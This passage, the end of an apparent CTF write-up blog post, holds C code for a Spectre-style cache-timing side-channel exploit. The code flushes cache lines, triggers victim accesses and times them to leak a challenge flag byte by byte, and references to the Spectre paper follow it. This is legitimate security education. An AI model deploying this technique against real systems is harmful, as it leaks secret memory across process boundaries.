+            <span class="n">best_candidate</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">best_candidate</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="cm">/* Leak the char at baby_array[index].
+ * We do it 10 times and return the char with highest score
+ */</span>
+<span class="kt">char</span> <span class="nf">leak_char</span><span class="p">(</span><span class="kt">int</span> <span class="n">index</span><span class="p">){</span>
+
+    <span class="kt">uint8_t</span> <span class="n">scores</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+
+    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
+        <span class="c1">// Flush the cache</span>
+        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">_mm_clflush</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)(</span><span class="n">the_array</span> <span class="o">+</span> <span class="n">j</span> <span class="o">*</span> <span class="n">PAGE_SIZE</span><span class="p">));</span>
+        <span class="p">}</span>
+
+        <span class="c1">// Make the victim access the_array[baby_array[index] * PAGE_SIZE]</span>
+        <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
+        <span class="n">sprintf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">"%2d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">index</span><span class="p">);</span>
+        <span class="n">write</span> <span class="p">(</span><span class="n">STDOUT_FILENO</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>
+        <span class="n">scores</span><span class="p">[</span><span class="n">get_min_access_time</span><span class="p">()]</span><span class="o">++</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Find the char with max score</span>
+    <span class="kt">char</span> <span class="n">leaked_char</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="kt">uint8_t</span> <span class="n">highest_score</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">scores</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">highest_score</span><span class="p">){</span>
+            <span class="n">highest_score</span> <span class="o">=</span> <span class="n">scores</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+            <span class="n">leaked_char</span> <span class="o">=</span> <span class="n">i</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="n">leaked_char</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+
+    <span class="kt">char</span> <span class="n">leaked_flag</span> <span class="p">[</span><span class="n">FLAG_SIZE</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+
+    <span class="n">the_array</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">map_file</span><span class="p">(</span><span class="s">"./chall"</span><span class="p">)</span> <span class="o">+</span> <span class="n">OFFSET_TO_THE_ARRAY</span><span class="p">);</span>
+
+    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">FLAG_SIZE</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
+        <span class="n">leaked_flag</span> <span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">leak_char</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">48</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">Leaked flag : %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">leaked_flag</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></table></code></div></div><p>Here is the final result:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/norzh_sidechannel/leaked_flag_top.png" alt="" /></p><h2 id="references">References</h2><hr /><p><a href="https://beta.hackndo.com/construction-poc-spectre/">https://beta.hackndo.com/construction-poc-spectre/</a></p><p><a href="https://spectreattack.com/spectre.pdf">https://spectreattack.com/spectre.pdf</a></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/exploit-development/'>Exploit development</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >CTF</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >WriteUp</a> <a href="/tags/side-channel/" class="post-tag no-text-decoration" >Side Channel</a> <a href="/tags/spectre/" class="post-tag no-text-decoration" >Spectre</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=CTF Writeup - NorzhCTF - S1de Ch4nnel - RAC Blog&url=https://Richard-AC.github.io/posts/NORZH-sidechannel/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=CTF Writeup - NorzhCTF - S1de Ch4nnel - RAC Blog&u=https://Richard-AC.github.io/posts/NORZH-sidechannel/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=CTF Writeup - NorzhCTF - S1de Ch4nnel - RAC Blog&url=https://Richard-AC.github.io/posts/NORZH-sidechannel/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/rdbg/">rdbg - A Rust library for writing custom Windows debuggers</a><li><a href="/posts/fuzzing-brava/">Fuzzing Closed-Source Windows Programs</a><li><a href="/posts/old_page/">My portfolio</a><li><a href="/posts/SEH/">Clearing up Windows SEH exploitation</a><li><a href="/posts/sudo-cve/">Exploiting CVE-2021-3156 (sudo heap overflow)</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/debugging/">Debugging</a> <a class="post-tag" href="/tags/exploits/">Exploits</a> <a class="post-tag" href="/tags/reverse-engineering/">Reverse Engineering</a> <a class="post-tag" href="/tags/archive/">archive</a> <a class="post-tag" href="/tags/automation/">Automation</a> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/cve-2021-3156/">CVE-2021-3156</a> <a class="post-tag" href="/tags/cve/">CVE</a> <a class="post-tag" href="/tags/fuzzing/">Fuzzing</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/SEH/"><div class="card-body"> <span class="timeago small" > Jan 6, 2021 <i class="unloaded">2021-01-06T19:33:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Clearing up Windows SEH exploitation</h3><div class="text-muted small"><p> Introduction SEH is an exception handling mechanism used in Windows programs which has been abused by exploit writers for years. This Corelan article gives a good introduction to SEH and present...</p></div></div></a></div><div class="card"> <a href="/posts/sudo-cve/"><div class="card-body"> <span class="timeago small" > Feb 16, 2021 <i class="unloaded">2021-02-16T19:33:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Exploiting CVE-2021-3156 (sudo heap overflow)</h3><div class="text-muted small"><p> Introduction Last month, in this article, Qualys disclosed a vulnerability that has been affecting all versions of the program sudo for the last 10 years which can lead to a local privilege esc...</p></div></div></a></div><div class="card"> <a href="/posts/rdbg/"><div class="card-body"> <span class="timeago small" > Feb 27 <i class="unloaded">2023-02-27T08:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>rdbg - A Rust library for writing custom Windows debuggers</h3><div class="text-muted small"><p> rdbg on Github Introduction Writing a custom debugger can be very useful for many program analysis tasks. MSDN provides a useful template which I ended up using many times including in my Triage...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/sudo-cve/" class="btn btn-outline-primary"><p>Exploiting CVE-2021-3156 (sudo heap overflow)</p></a> <a href="/posts/fuzzing-brava/" class="btn btn-outline-primary"><p>Fuzzing Closed-Source Windows Programs</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/username">Richard AC</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/debugging/">Debugging</a> <a class="post-tag" href="/tags/exploits/">Exploits</a> <a class="post-tag" href="/tags/reverse-engineering/">Reverse Engineering</a> <a class="post-tag" href="/tags/archive/">archive</a> <a class="post-tag" href="/tags/automation/">Automation</a> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/cve-2021-3156/">CVE 2021 3156</a> <a class="post-tag" href="/tags/cve/">CVE</a> <a class="post-tag" href="/tags/fuzzing/">Fuzzing</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script> <script> $(function() { let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://Richard-AC.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
